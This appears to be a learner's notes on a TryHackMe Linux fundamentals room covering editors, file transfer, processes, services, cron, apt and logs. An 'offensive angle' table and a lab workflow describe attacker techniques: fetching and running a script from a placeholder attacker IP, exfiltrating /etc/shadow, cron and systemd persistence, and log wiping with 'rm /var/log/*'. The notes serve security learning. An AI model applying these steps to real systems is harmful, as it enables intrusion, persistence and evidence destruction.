# Linux Fundamentals Part 3

**Path:** Cyber Security 101 → Linux Fundamentals
**Room:** [Linux Fundamentals Part 3](https://tryhackme.com/room/linuxfundamentalspart3)
**Difficulty:** Info · **Time:** ~18 min · **Completed:** 2026-07-21

> Builds on [linux-fundamentals-1.md](./linux-fundamentals-1.md) and [linux-fundamentals-2.md](./linux-fundamentals-2.md). See [linux-commands.md](../references/linux-commands.md) for the updated cheat sheet.

## What the room covered

Day-to-day utilities you'll actually reach for on a Linux box: terminal text editors (`nano`, `vim`), file transfer (`wget`, `scp`, Python's built-in HTTP server), processes and services (`ps`, `top`, `kill`, `systemctl`, background / foreground), scheduled automation with `cron`, package management with `apt`, and log review under `/var/log`.

## Key concepts

**Text editors.** Two you'll meet everywhere:

| Editor | Style | Exit |
| --- | --- | --- |
| `nano <file>` | Modeless — type text, use `Ctrl`+letter shortcuts. Beginner-friendly. | `Ctrl+X` (then `Y` to save) |
| `vim <file>` | Modal — press `i` to insert, `Esc` back to command mode. Faster once learned. | `:wq` (write and quit), `:q!` (quit without saving) |

`nano` shows its shortcuts at the bottom of the screen (`^X` means `Ctrl+X`). If you're SSH'd into a minimal container or embedded system where `nano` isn't installed, `vi` / `vim` always is — worth knowing at least the basics.

**File transfer.**

| Command | Use |
| --- | --- |
| `wget <url>` | Download over HTTP/HTTPS. Standard tool for pulling files from a web server. |
| `scp <src> <user>@<host>:<dst>` | Copy file from local to remote over SSH. |
| `scp <user>@<host>:<src> <dst>` | Copy file from remote to local. |
| `python3 -m http.server` | Instant web server on port 8000 serving the current directory. Ubuntu ships with Python3, so this works anywhere. |

`python3 -m http.server` + `wget` is the everyday tool combo for shuffling a script between two boxes when you don't have SSH keys or a shared network mount. Serve from box A, `wget` from box B.

**Processes.** Every running program has a **PID** (process ID), an owner, and CPU/memory usage. PIDs increment as processes start.

| Command | Use |
| --- | --- |
| `ps` | List processes in your current session. |
| `ps aux` | List every process on the system — including root and system daemons. |
| `top` | Live process view, refreshes every few seconds. Sort by CPU/memory. |
| `kill <PID>` | Send `SIGTERM` — asks the process to shut down cleanly. |
| `kill -9 <PID>` | Send `SIGKILL` — immediate termination, no cleanup. Use as last resort. |
| `kill -STOP <PID>` | Send `SIGSTOP` — pause the process. |

**Signals worth knowing:**
- **SIGTERM** (15) — polite "please shut down." Programs can catch this and clean up.
- **SIGKILL** (9) — the kernel forcibly ends the process. Nothing gets to clean up.
- **SIGSTOP** (19) — pause. `SIGCONT` resumes.

**Services.** Long-running programs (web servers, databases, SSH daemon) are managed by `systemd`. The `systemctl` command controls them:

```bash
systemctl start <service>       # start now
systemctl stop <service>        # stop now
systemctl restart <service>     # stop then start
systemctl enable <service>      # start on boot
systemctl disable <service>     # don't start on boot
systemctl status <service>      # is it running?
```

**Backgrounding jobs.** Three ways to keep a terminal usable while a slow command runs:

```bash
sleep 60 &        # "&" runs it in the background immediately
# ...or start it normally, then press Ctrl+Z to suspend
fg                # bring the backgrounded job back to the foreground
bg                # let a suspended job continue running in the background
jobs              # list your backgrounded jobs
```

**Cron — scheduled automation.** `cron` runs commands on a schedule. Each user has a **crontab** (cron table). Edit with `crontab -e`, list with `crontab -l`. Every line has six fields:

```
# MIN  HOUR  DOM  MON  DOW  CMD
  0    */12  *    *    *    cp -R /home/cmnatic/Documents /var/backups/
```

- **MIN** — minute (0–59)
- **HOUR** — hour (0–23)
- **DOM** — day of month (1–31)
- **MON** — month (1–12)
- **DOW** — day of week (0–6, 0=Sunday)
- **CMD** — the actual command

`*` means "any". `*/12` in the hour field means every 12 hours. Special shortcuts: `@reboot` runs once when the system boots, `@daily` at midnight, `@hourly` on the hour.

**Package management — `apt`.**

```bash
sudo apt update                  # refresh the list of available packages
sudo apt upgrade                 # upgrade every installed package
sudo apt install <package>       # install
sudo apt remove <package>        # uninstall (leaves config files)
sudo apt purge <package>         # uninstall including config
sudo apt search <keyword>        # search available packages
apt list --installed             # show what's installed
```

Repositories live in `/etc/apt/sources.list` and `/etc/apt/sources.list.d/`. Third-party repos add a file there plus a GPG key (`apt-key`) so the package signatures verify. `add-apt-repository` automates both steps.

**Logs — `/var/log`.** Almost every service writes here:

| Path | What lives there |
| --- | --- |
| `/var/log/auth.log` | Every login attempt, sudo use, SSH connection |
| `/var/log/syslog` | General system messages |
| `/var/log/apache2/access.log` | Every HTTP request the web server served |
| `/var/log/apache2/error.log` | Web server errors |
| `/var/log/fail2ban.log` | Attempted brute-force blocks |
| `/var/log/ufw.log` | Firewall events |

## Mental model

Parts 1 and 2 gave you enough to *survive* on a Linux box. Part 3 gives you what you need to *run* one: how to edit config, install software, schedule work, watch processes, and read what the machine actually did. Every one of these tools shows up in both directions — defenders use `ps`, `crontab -l`, and log tailing to spot compromise; attackers use the same tools to establish persistence and cover their tracks.

Once you can move files, edit configs, install packages, schedule jobs, and read logs, you're an operator. Every future room — privesc, web hacking, forensics — assumes fluency here.

## Offensive angle

| Concept | Attacker use |
| --- | --- |
| `nano` / `vim` | Edit config files after landing on the box — add SSH keys, modify sudoers, drop web-shell payloads. |
| `wget <attacker_url>` | Pull the second-stage payload (LinPEAS, netcat static binary, reverse shell) after initial code execution. Standard step in every Linux exploitation chain. |
| `scp` | Exfiltrate captured data (`/etc/shadow`, database dumps, source code) to the attacker's box. |
| `python3 -m http.server` | Attacker's staging server. From your Kali box, serve payloads; the target `wget`s them. No auth, no logs on the target side. |
| `ps aux` | Enumerate running services. Look for outdated / vulnerable versions (`apache 2.4.29`, `sudo 1.8.31`) that map to public CVEs. |
| `top` / `ps aux` | Spot the defender's monitoring tools — osquery, sysmon, EDR agents — before making noise. |
| `kill` on defensive tools | Attackers with root try to `kill` or `systemctl stop` running EDR / logging services. Sophisticated defenders make these non-killable. |
| `systemctl enable <malicious.service>` | Persistence — write a systemd unit file that runs your reverse shell, enable it, survive reboot. Classic Linux persistence pattern. |
| `crontab -e` or `/etc/cron.d/` | Same — drop a cron job that reconnects every 5 minutes. Even better if you write to another user's cron so it runs as them. |
| Cron misconfigurations | Look for cron jobs running as root that call scripts writable by your user. Overwrite the script, get root when cron next fires. Textbook privesc. |
| `apt install` misuse | If `sudo -l` shows you can run `apt` as root, GTFOBins has trick lines like `sudo apt-get changelog apt` that spawn a root shell. |
| `/var/log/auth.log` | Attacker: read to see what the defender saw. Defender: watch for repeated failed SSH from one IP, sudden sudo use by a normal user, service restarts at odd times. |
| `/var/log/apache2/access.log` | Every reconnaissance scan (dirbuster, Nikto, sqlmap) leaves a fingerprint here. First place to look after a suspected web compromise. |
| Log clearing (`rm /var/log/*` or `> /var/log/auth.log`) | Anti-forensics. Attackers with root wipe or truncate logs to hide activity. Defenders should ship logs off-host in real time (SIEM) so on-host tampering doesn't lose them. |
| Rotated logs | Old logs get gzipped as `auth.log.1.gz`, `auth.log.2.gz`. `zgrep` searches inside them without decompressing. |

**The persistence pattern.** After a compromise, attackers pick from the same short menu: an SSH key in `authorized_keys`, a cron job, a systemd service, a modified startup script. Every one uses the tools in this room. Defenders looking for compromise walk the same list in reverse.

## Practical — the room's chained workflow

```bash
# stage a file for transfer from your machine
user@attackbox:/tmp# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000

# on the target, pull it
tryhackme@linux3:/tmp$ wget http://<ATTACKER_IP>:8000/enum.sh
tryhackme@linux3:/tmp$ chmod +x enum.sh && ./enum.sh

# check what's running and who owns it
tryhackme@linux3:~$ ps aux | grep apache
tryhackme@linux3:~$ systemctl status apache2

# check for scheduled jobs
tryhackme@linux3:~$ crontab -l
tryhackme@linux3:~$ cat /etc/crontab
tryhackme@linux3:~$ ls -la /etc/cron.d/

# read what happened
tryhackme@linux3:~$ sudo tail -f /var/log/auth.log
tryhackme@linux3:~$ zgrep "Failed password" /var/log/auth.log*
```

That's the operator loop — stage tooling, look at running work, look at scheduled work, read the logs.

## What clicked

The unified pattern under processes, services, and cron. All three are just "things running on this box":
- **Foreground processes** — you started them, they run until you close the terminal.
- **Background processes** — same, but decoupled from the terminal (`&`, `bg`).
- **Services** — processes managed by systemd, restarted automatically, run on boot (`systemctl enable`).
- **Cron jobs** — processes scheduled to run at specific times.

Each is a different answer to the same question: "when should this thing run, and by whom?" Once I saw the ladder from one-shot foreground command → background → service → cron, the whole space of "how do things run on Linux" collapsed into one mental model.

## What to revisit

- `vim` basics — `i`, `Esc`, `:wq`, `:q!`, `dd`, `yy`, `p`. Enough to survive when `nano` isn't installed.
- `systemd` unit files — what's inside `/etc/systemd/system/*.service`. Writing a persistence service by hand is a common Linux exploitation exercise.
- Cron file paths beyond `crontab -e` — `/etc/crontab`, `/etc/cron.d/`, `/etc/cron.daily/`. Attackers hide jobs across all of these.
- Reading rotated logs with `zgrep`, `zcat`, `journalctl` (for systemd services). The room only covers plain-text log tails.
- Package repos and GPG key signing — the room glosses this; understanding why `apt update` verifies signatures matters for both trusting third-party PPAs and understanding supply-chain attacks.
